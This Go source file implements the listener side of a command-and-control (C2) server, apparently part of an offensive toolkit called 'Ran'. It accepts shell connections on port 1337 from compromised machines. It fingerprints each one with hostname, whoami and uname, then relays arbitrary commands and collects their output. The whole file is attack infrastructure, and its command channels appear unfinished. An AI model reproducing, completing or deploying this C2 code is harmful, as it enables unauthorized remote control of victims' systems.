package c2

import (
	"bufio"
	"context"
	"fmt"
	"log/slog"
	"net"
	"strconv"
	"strings"
	"sync"

	bus "github.com/Magier/Ran/internal"
)

type C2Started struct {
}

func (c C2Started) EventName() string {
	return "c2 started"
}

type SessionStarted struct {
	Hostname string
	Os       string
	User     string
}

func (c SessionStarted) EventName() string {
	return fmt.Sprintf("session started: [%s] %s@%s\n", c.Hostname, c.User, c.Os)
}

func StartC2(ctx context.Context, mb bus.MessageBus) {
	var wg sync.WaitGroup
	wg.Add(1)
	port := 1337
	go func() {
		startListener(ctx, mb, port)
		wg.Done()
	}()
	err := mb.Publish(C2Started{})
	if err != nil {
		panic(err)
	}
	wg.Wait()
}

func startListener(ctx context.Context, bus bus.MessageBus, port int) {
	listener, err := net.Listen("tcp", ":"+strconv.Itoa(port))
	if err != nil {
		fmt.Println("Unable to bin to port:", err)
		return
	}
	defer listener.Close()

	err = bus.Publish(ListenerReady{Name: "listener", Port: port})
	if err != nil {
		fmt.Println("Error publishing listener event:", err)
	}

	for {
		select {
		case <-ctx.Done():
			slog.InfoContext(ctx, "Shutting down listener")
			return
		default:
			// Accept incoming connections
			conn, err := listener.Accept()
			if err != nil {
				fmt.Println("Error:", err)
				continue
			}

			// bus.Publish()
			// Handle client connection in a goroutine
			in := make(chan string, 5)
			out := make(chan string, 5)
			go handleSession(ctx, bus, conn, in, out)
		}
	}
}

func sendCommand(conn net.Conn, cmd string) (string, error) {
	writer := bufio.NewWriter(conn)
	// _, err := conn.Write([]byte(cmd))
	slog.Debug("Sent command: ", cmd, "")
	// fmt.Println("Sent command:", cmd)
	if _, err := writer.WriteString(cmd + "\n"); err != nil {
		fmt.Println("Error sending command:", err)
		return "", err
	}
	writer.Flush()
	// raw_result := make([]byte, 1024)
	reader := bufio.NewReader(conn)
	s, err := reader.ReadString('\n') // maybe use scanner instead?
	slog.Debug("Rx Simple IO:", s, "")
	if err != nil {
		fmt.Println("Error receiving command response:", err)
		return "", err
	}
	return strings.Trim(s, "\n"), nil
}

func handleSession(ctx context.Context, bus bus.MessageBus, conn net.Conn, cmds <-chan string, results chan<- string) {
	defer conn.Close()
	fmt.Println("Handling session")

	hostname, err := sendCommand(conn, "hostname")
	if err != nil {
		fmt.Println("Error reading from connection:", err)
	}
	user, err := sendCommand(conn, "whoami")
	if err != nil {
		fmt.Println("Error reading from connection:", err)
	}
	os, err := sendCommand(conn, "uname")
	if err != nil {
		fmt.Println("Error reading from connection:", err)
	}
	// results <- os
	bus.Publish(SessionStarted{
		Hostname: hostname,
		Os:       os,
		User:     user,
	})

	for {
		select {
		case <-ctx.Done():
			close(results)
			return
		default:
			cmd := <-cmds

			res, err := sendCommand(conn, cmd)
			if err != nil {
				fmt.Println("Error for ", cmd, ": ", err)
			}
			fmt.Println("Received data:", string(res))
			results <- res
		}
	}
}
